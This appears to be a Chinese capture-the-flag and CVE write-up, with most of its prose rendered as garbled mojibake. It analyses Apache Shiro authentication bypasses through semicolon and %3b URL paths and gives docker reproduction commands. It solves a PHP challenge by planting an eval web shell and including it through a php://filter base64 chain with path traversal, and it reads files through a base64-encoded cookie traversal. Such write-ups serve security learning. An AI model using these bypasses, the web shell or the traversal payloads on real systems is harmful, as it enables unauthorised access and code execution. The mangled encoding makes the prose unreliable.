&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png" alt="image-20211026105323534">&lt;/p>
&lt;p>è·Ÿå…¥æ­¤å‡½æ•°çš„å¤„ç†é€»è¾‘&lt;code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication&lt;/code>ï¼Œè¿›å…¥&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png" alt="image-20211026113806371">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä¸­é—´è¿‡ç¨‹ä¸­uri=&amp;quot;/;/admin/page&amp;quot;ï¼Œä½†æ˜¯ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡&lt;code>normalize(decodeCleanUriString())&lt;/code>å¤„ç†è¿‡åè¿”å›çš„requestRUI=&amp;quot;/&amp;quot;ï¼Œè·Ÿå…¥è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå…ˆæ˜¯è°ƒç”¨&lt;code>decodeRequestSrting()&lt;/code>ï¼Œæ²¡æœ‰å¯¹ç»“æœäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png" alt="image-20211026114857281">&lt;/p>
&lt;p>è€Œè¿”å›æ—¶çš„&lt;code>normalize()&lt;/code>ä¼šæ ¹æ®&amp;quot;;&amp;ldquo;è¿›è¡Œurlçš„æˆªæ–­å¤„ç†ï¼Œæœ€ç»ˆè¿”å›&amp;rdquo;/&amp;quot;&lt;/p>
&lt;p>å›åˆ°å¼€å¤´çš„/;/admin/pageè¯·æ±‚ï¼Œspringä¸­å¤„ç†urlçš„å‡½æ•°åœ¨&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png" alt="image-20211026115653673">&lt;/p>
&lt;p>å®ƒè°ƒç”¨çš„æ˜¯springframeworkä¸­è‡ªå·±&lt;code>getPathWithinApplication()&lt;/code>ï¼Œç»è¿‡ä¸€ç•ªéªšæ“ä½œè¿”å›çš„æ˜¯/admin/page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png" alt="image-20211026115916664">&lt;/p>
&lt;p>è·Ÿå…¥&lt;code>getPathWitinApplication()&lt;/code>ï¼Œå…ˆæ˜¯è°ƒç”¨&lt;code>getContextPath()&lt;/code>ï¼Œè¿”å›&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png" alt="image-20211026120922475">&lt;/p>
&lt;p>ç„¶åæ˜¯&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png" alt="image-20211026121402778">&lt;/p>
&lt;p>åŒæ ·ï¼Œåœ¨æœ€ç»ˆreturnä¹‹å‰çš„uri=&amp;quot;/;/admin/page&amp;quot;ï¼Œç»è¿‡äº†ä¸€ä¸ª&lt;code>decodeAndCleanUriString()&lt;/code>ï¼Œæ ¹æ®ch=59ä¹Ÿå°±æ˜¯&amp;quot;;&amp;ldquo;ç¬¦è¿›è¡Œä¸€ä¸ªåˆ†å‰²ï¼Œä½¿ç”¨&lt;code>removeSemicolonContentInternal()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png" alt="image-20211026121749767">&lt;/p>
&lt;p>äºæ˜¯&amp;rdquo;;&amp;ldquo;å°±ä¸è§äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png" alt="image-20211026122016422">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png" alt="image-20211026122121074">&lt;/p>
&lt;p>ç„¶åè¿”å›&amp;rdquo;/admin/page&amp;quot;ç»™&lt;code>getPathWithinApplication()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png" alt="image-20211026122204403">&lt;/p>
&lt;p>å†ä¼ é€’ç»™&lt;code>getPathWithinServletMapping()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png" alt="image-20211026122355835">&lt;/p>
&lt;p>æœ€ç»ˆæˆ‘ä»¬è®¿é—®åˆ°çš„é¡µé¢å°±æ˜¯&amp;quot;/admin/page&amp;quot;äº†&lt;/p>
&lt;p>â€”â€”â€”â€”æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½“urlåœ¨shiroå’Œspringä¸­çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå½“è¿›å…¥åº”ç”¨æ—¶è¢«è®¤ä½œæ˜¯è®¿é—®&amp;quot;/;/admin/page&amp;quot;ï¼Œä¸å±äºæˆ‘ä»¬æœ€åˆé…ç½®çš„&amp;quot;/admin/*&amp;ldquo;æƒé™è·¯ç”±ï¼Œè€Œè¿›å…¥shiroåå´è¢«æˆªæ–­å¤„ç†ï¼Œè®¤ä½œæ˜¯&amp;rdquo;/admin/page&amp;quot;ï¼Œå±äºæƒé™è·¯ç”±ä¸­ï¼Œæœ€ç»ˆåšåˆ°æƒé™ç»•è¿‡&lt;/p>
&lt;h3 id="cve-2020-13933">CVE-2020-13933&lt;/h3>
&lt;p>ç”±äº11989çš„ä¿®è¡¥å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´åˆåˆåˆè¢«ç»•è¿‡äº§ç”Ÿäº†13933â€¦â€¦&lt;/p>
&lt;h4 id="æœ¬åœ°ç¯å¢ƒæ­å»ºå¤ç°-1">æœ¬åœ°ç¯å¢ƒæ­å»º&amp;amp;å¤ç°&lt;/h4>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.anquanke.com/post/id/214964#h2-3">shiro &amp;lt; 1.6.0çš„è®¤è¯ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-13933)&lt;/a>&lt;/p>
&lt;p>è¿˜æ˜¯é‡‡ç”¨dockerå½¢å¼å¤ç°ï¼ˆæˆ‘çˆ±dockerï¼‰è¿™é‡Œç›´æ¥å°±æ˜¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‘½ä»¤å•¦ï¼Œè·Ÿä¸Šé¢çš„ä¸€æ ·é…ç½®å°±å¥½äº†ï¼ˆ&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-13933
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>è®¿é—®/adminï¼ŒæŠ¥é”™é¡µé¢ä¸”æ— 302è·³è½¬ï¼›è®¿é—®/loginè·³è½¬åˆ°èº«ä»½éªŒè¯é¡µé¢ï¼›è®¿é—®/admin/%3bpageï¼Œæ— èº«ä»½éªŒè¯ä¸”è¿”å›admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png" alt="image-20211026171901636">&lt;/p>
&lt;h4 id="åŸç†åˆ†æåŠ¨è°ƒ">åŸç†åˆ†æ&amp;amp;åŠ¨è°ƒ&lt;/h4>
&lt;p>è¿˜æ˜¯å¯¼å…¥jaråŒ…è‡³ideaï¼Œè¿œç¨‹debug&lt;/p>
&lt;p>ç›´æ¥çœ‹çœ‹shiro1.6.0çš„è¡¥ä¸è¡¥åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Œåœ¨githubä¸ŠæŸ¥çœ‹&lt;a href="https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0">diff&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png" alt="image-20211026175139677">&lt;/p>
&lt;p>å¢åŠ äº†&lt;code>InvalidRequestFilter&lt;/code>ç±»ï¼Œæœ‰ä¸ª&lt;code>isAccessAllowed()&lt;/code>å‡½æ•°ï¼Œåœ¨å…¨å±€ä¸Šå¯¹åˆ†å·ã€åæ–œæ ã€éASCIIç å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤&lt;/p>
&lt;p>ä»¥è®¿é—®/admin/%3bpageä¸ºä¾‹ï¼Œurlå…ˆç”±shiroè§£æï¼Œè¿˜æ˜¯&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>ï¼Œä¾æ—§æ˜¯è°ƒç”¨&lt;code>getPathWithinApplication()&lt;/code>ï¼Œæ‰§è¡ŒårequestURI=&amp;quot;/admin/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png" alt="image-20211026181015088">&lt;/p>
&lt;p>è€Œä¹‹åè¿›å…¥springbootå¤„ç†æ—¶ï¼Œå´å˜æˆäº†&amp;quot;/admin/;page&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png" alt="image-20211026181252374">&lt;/p>
&lt;p>å†å›åˆ°æœ€åˆè·Ÿä¸€ä¸‹å…·ä½“çš„è°ƒç”¨é“¾&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png" alt="image-20211026182540363">&lt;/p>
&lt;p>åœ¨&lt;code>removeSemicolon()&lt;/code>å¤„ç†å‰ï¼Œuri=&amp;quot;/admin/;page&amp;quot;ï¼ˆç»&lt;code>decodeAndUriString()&lt;/code>è§£ç äº†ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png" alt="image-20211026182711164">&lt;/p>
&lt;p>å¤„ç†åpath=&amp;quot;/admin&amp;quot;ï¼Œæ¥ç€è°ƒç”¨&lt;code>normalize()&lt;/code>å‡½æ•°å˜æˆ&amp;quot;/admin&amp;quot;ï¼Œä¼ é€’ç»™æœ€åˆçš„&lt;code>getChain()&lt;/code>ä¸­çš„requestURIå‚æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png" alt="image-20211026183041350">&lt;/p>
&lt;p>ä¹‹åè¢«springå¤„ç†&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>ï¼Œå…¶ä¸­ä¼šè°ƒç”¨&lt;code>getRequestUri()&lt;/code>ï¼Œå®ƒä¼šå†æ¬¡è°ƒç”¨&lt;code>decodeAndCleanUriString()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png" alt="image-20211026183542060">&lt;/p>
&lt;p>å…ˆ&lt;code>removeSemicolonContent()&lt;/code>å†&lt;code>decodeRequestString()&lt;/code>ï¼Œé‚£æ˜¾ç„¶æ˜¯æ€ä¹ˆéƒ½å»ä¸æ‰&amp;quot;;&amp;ldquo;äº†ï¼Œå°†&amp;rdquo;;page&amp;quot;çœ‹ä½œä¸€ä¸ªæ•´ä½“&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png" alt="image-20211026184529505">&lt;/p>
&lt;p>æˆ‘ä»¬å›è¿‡å¤´å»çœ‹è¿™æ¬¡çš„æƒé™è®¾ç½®æ˜¯æ€ä¹ˆåŒ¹é…urlçš„ï¼Œå®šä½åˆ°&lt;code>org.syclover.srpingbootshiro.LoginController&lt;/code>å’Œ&lt;code>org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png" alt="image-20211026190414964">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png" alt="image-20211026190401468">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº&amp;quot;/admin/*&amp;ldquo;éœ€è¦é‰´æƒï¼Œ&amp;quot;/admin/{name}&amp;ldquo;è¿”å›admin pageï¼Œè€Œå¯¹äº&amp;rdquo;/admin/&amp;ldquo;å´æ²¡æœ‰è®¾ç½®æƒé™&lt;/p>
&lt;p>ä»ä¸Šé¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬çŸ¥é“shiroå¾—åˆ°çš„æ˜¯&amp;rdquo;/admin/&amp;quot;ï¼ˆå…ˆdecodeå†å»é™¤&amp;rdquo;;&amp;quot;ï¼‰ï¼Œè¢«è®¤ä½œå¯ä»¥è®¿é—®ï¼›è€Œspringå¾—åˆ°çš„æ˜¯&amp;quot;/admin/;page&amp;quot;ï¼‰å…ˆå»é™¤&amp;quot;;&amp;ldquo;å†decodeï¼‰ï¼Œä¸&amp;rdquo;/admin/{name}&amp;ldquo;çš„æ ·å¼åŒ¹é…ï¼Œæœ€åè¿”å›admin page &lt;del>ï¼ˆç®€ç›´å¤ªå®Œç¾äº†ä¹Ÿ&lt;/del>&lt;/p>
&lt;h4 id="ä¸´æ—¶ä¿®å¤">*ä¸´æ—¶ä¿®å¤&lt;/h4>
&lt;p>ï¼ˆæœ¬åœ°æš‚æ—¶è¿˜æœªå¤ç°&lt;/p>
&lt;pre tabindex="0">&lt;code>map.put(&amp;quot;/admin/**&amp;quot;, &amp;quot;authc&amp;quot;);
@GetMapping({&amp;quot;/admin/page&amp;quot;})
public String admin() {
return &amp;quot;admin page&amp;quot;;
}
&lt;/code>&lt;/pre>&lt;h3 id="cve-2020-36188">***CVE-2020-36188&lt;/h3>
&lt;p>&lt;code>ch.qos.logback.core.db.JNDIConnectionSource&lt;/code>&lt;/p>
&lt;p>å¯ä»¥å‚è€ƒ &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro&lt;/a>ï¼Œå·¥å…· &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a> | &lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit&lt;/a>&lt;/p>
&lt;p>â€”â€”â€”â€”ç”±äºæˆ‘çš„javaæ°´å¹³å®åœ¨å¤Ÿå‘›ï¼Œè¿™é‡Œæš‚æ—¶å…ˆç©ºç€ï¼Œç­‰æˆ‘å­¦ä¸€å­¦java ä¹‹åå¿…å®šå›æ¥é­å°¸&lt;/p>
&lt;h2 id="easyfilter">EasyFilter&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;open_basedir&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;./&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">elseif&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;php://filter/resource=&lt;/span>&lt;span style="color:#d88200">$file&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?action=w&amp;amp;c=&amp;lt;?php @eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?action=r&amp;amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
POST: wuhu=phpinfo();
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png" alt="image-20211023214748589">&lt;/p>
&lt;h3 id="å¯¹äºpayloadçš„åº•å±‚ä»£ç åˆ†æ">å¯¹äºpayloadçš„åº•å±‚ä»£ç åˆ†æ&lt;/h3>
&lt;p>åŸç†åˆ†ææ¥è‡ªGuokeä½¬ æˆ‘åªæ˜¯ä¸ªä¼šå¤ç°çš„é“æ²¸ç‰©â€¦â€¦&lt;/p>
&lt;p>é¦–å…ˆä¸‹ä¸€ä»½7.2.34çš„æºç &lt;/p>
&lt;p>å®šä½åˆ°åŒ…è£…å™¨æ‰€åœ¨çš„æ–‡ä»¶ä½ç½®/ext/standard/php_fopen_wrapper.cï¼Œ178è¡Œèµ·æ˜¯php_stream_url_wrap_php()çš„ä»£ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png" alt="image-20211024210116402">&lt;/p>
&lt;p>191è¡Œï¼Œå…ˆç¢°åˆ°&lt;code>php://&lt;/code>ä¼šæ‰§è¡Œ&lt;code>path += 6&lt;/code>ï¼›ä¹‹åæ¥ç€349è¡Œä¼šç¢°åˆ°&lt;code>filter/&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png" alt="image-20211024210420398">&lt;/p>
&lt;p>æ²¡æœ‰modeï¼Œæ­¤æ—¶&lt;/p>
&lt;pre tabindex="0">&lt;code>path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>357è¡Œæ‰§è¡Œstrdup()ï¼ŒæŠŠpathç¬¬6ä½ä¹‹åçš„å†…å®¹èµ‹ç»™pathdupæŒ‡é’ˆä¸Š&lt;/p>
&lt;pre tabindex="0">&lt;code>pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>358è¡Œstrstr()è¿”å›pathdupçš„æŒ‡é’ˆä¸­/resource=å‡ºç°çš„ä½ç½®ï¼Œåˆ°365è¡Œçš„åˆ¤æ–­&lt;/p>
&lt;pre tabindex="0">&lt;code>p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>372è¡Œçš„php_strtok_r()å¯¹pathdup+1çš„ä½ç½®ä»¥'/&amp;lsquo;ä¸ºæ ‡å¿—è¿›è¡Œåˆ†å‰²&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°resource=ï¼Œè¿›373è¡Œçš„whileå¾ªç¯ï¼Œå…ˆæ˜¯åˆ°378è¡Œçš„php_stream_apply_filter_list()ï¼Œè½¬è‡³159è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png" alt="image-20211024230730886">&lt;/p>
&lt;p>å°†pä½œä¸ºè¿‡æ»¤å™¨è¿›è¡Œæ³¨å†Œï¼Œ161è¡Œphp_stream_filter_append()åº”ç”¨åˆ°æ–‡ä»¶æµä¸Šï¼Œä½†æ˜¾ç„¶resourceä¸æ˜¯æµåŒ…è£…å™¨ï¼Œå¹²ä¸äº†äº‹ï¼Œé‚£å°±å†åˆ°whileå¾ªç¯é‡Œæ¥ç€å‘åæ‰¾ï¼Œç›´åˆ°å‘åç¢°åˆ°read&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>è¿›å…¥374è¡Œï¼Œæ‰§è¡Œphp_stream_apply_filter_listä¹‹åå°±å˜æˆäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>p=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>æ­¤æ—¶çš„p=convert.base64-decodeï¼Œå°±å¯ä»¥æ­£å¸¸çš„b64è§£ç æˆ‘ä»¬çš„å†…å®¹äº†&lt;/p>
&lt;h3 id="å†å›å¤´çœ‹è¿™ä¸ªé¢˜">å†å›å¤´çœ‹è¿™ä¸ªé¢˜&lt;/h3>
&lt;p>ä»£ç å¾ˆçŸ­ï¼Œé™åˆ¶åœ¨äºå†™å…¥çš„æ–‡ä»¶å†…å®¹è¢«b64åŠ å¯†&amp;amp;open_basedir&amp;amp;includeå·²ç»å†™å¥½çš„åŒ…è£…å™¨å’Œä¸€éƒ¨åˆ†å›ºå®šçš„å†…å®¹&lt;/p>
&lt;p>æˆ‘åˆšå¼€å§‹å¡åœ¨äº†å·²ç»å†™æ­»çš„åŒ…è£…å™¨çš„å¼€å¤´è¿˜æ€ä¹ˆåŠ conver.base64-decodeï¼Ÿç„¶åå‘ç°æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œå¯ä»¥æ¥ç€å¥—ï¼Œåº•å±‚åŸç†è§ä¸Šï¼Œä¼šå‘åå¾ªç¯å–å€¼ç›´åˆ°ç¢°åˆ°ä¸€ä¸ªæ­£å¸¸çš„æµåŒ…è£…å™¨&lt;/p>
&lt;p>ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç›®å½•ç©¿è¶Šäº†ï¼Œå‰é¢åŠ äº†5å±‚buffï¼Œä»ç»“æœå€’æ¨æ„Ÿè§‰å¯ä»¥ç†è§£ï¼Œä½†æ˜¯è‡ªå·±å´æ²¡è¯•å‡ºæ¥ï¼Œæˆ‘çš„é—®é¢˜&lt;/p>
&lt;p>æœ€åopen_basedirçš„ç»•è¿‡åè€Œæ˜¯æœ€è½»æ¾çš„ï¼Œèšå‰‘æ’ä»¶ç›´æ¥æ&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.laruence.com/2010/05/04/1450.html">æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº&lt;/a> | &lt;a href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols / Wrappers&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨&lt;/a>&lt;/p>
&lt;h2 id="new_hospital">new_hospital&lt;/h2>
&lt;p>å“åº”cookieä¼šæœ‰ä¸ªAPI&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png" alt="image-20211023225411779">&lt;/p>
&lt;p>å°†APIè®¾ä¸ºflag.php &lt;code>ZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png" alt="image-20211023230544476">&lt;/p>
&lt;p>æ‰«ç›®å½• å¾—åˆ°/old/feature.php å°†è·¯å¾„æ”¹ä¸ºè¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png" alt="image-20211023230842820">&lt;/p>
&lt;p>å°†APIæ”¹ä¸º../flag.php &lt;code>Li4vZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png" alt="image-20211023230912588">&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®å¦‚æœå…ˆæ‰«ç›®å½•æ‰«åˆ°/old/feature.phpçš„è¯ï¼Œå¯ä»¥å°†APIè®¾ä¸º./feature.php &lt;code>Li9mZWF0dXJlLnBocA%3d%3d&lt;/code> è¯»åˆ°è¿™ä¸€æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png" alt="image-20211023231112340">&lt;/p>
&lt;p>åç«¯çš„é€»è¾‘å°±æ˜¯å°†cookie[&amp;lsquo;api&amp;rsquo;]å–å‡ºï¼Œç›´æ¥è¯»å‡ºå†…å®¹&lt;/p>
